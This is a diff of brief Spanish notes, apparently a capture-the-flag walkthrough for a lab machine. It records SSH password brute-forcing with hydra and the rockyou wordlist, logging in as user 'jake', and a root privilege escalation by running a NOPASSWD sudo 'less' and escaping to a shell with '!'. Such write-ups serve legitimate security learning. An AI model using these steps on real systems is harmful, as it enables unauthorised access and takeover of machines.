@@ -10,3 +10,6 @@
 - hacemos fuerza bruta al user ssh -> ❯ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.128.159.199
 - [22][ssh] host: 10.128.159.199   login: jake   password: X jee :)
 - ssh jake@10.128.159.199 entramos
+- (ALL) NOPASSWD: /usr/bin/less -> sudo -l
+- jake@brookly_nine_nine:/home/holt$ cat user.txt
+- sudo /usr/bin/less /etc/passwd y ejecutamos ! ->  somos root
